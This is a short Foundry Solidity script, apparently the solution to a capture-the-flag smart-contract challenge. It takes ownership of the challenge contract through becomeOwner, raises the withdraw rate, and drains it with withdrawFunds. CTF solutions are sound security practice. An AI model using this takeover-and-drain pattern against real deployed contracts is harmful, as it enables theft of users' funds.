// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "src/Challenge.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast(/* private key */);

        Challenge challenge = Challenge(/* challenge address */);
        address ctf = challenge.ctf();

        ctf.call(abi.encodeWithSignature("becomeOwner(uint256)", uint256(uint160(challenge.PLAYER()))));
        ctf.call(abi.encodeWithSignature("changeWithdrawRate(uint8)", uint256(10_000)));
        ctf.call(abi.encodeWithSignature("withdrawFunds()"));

        vm.stopBroadcast();
    }
}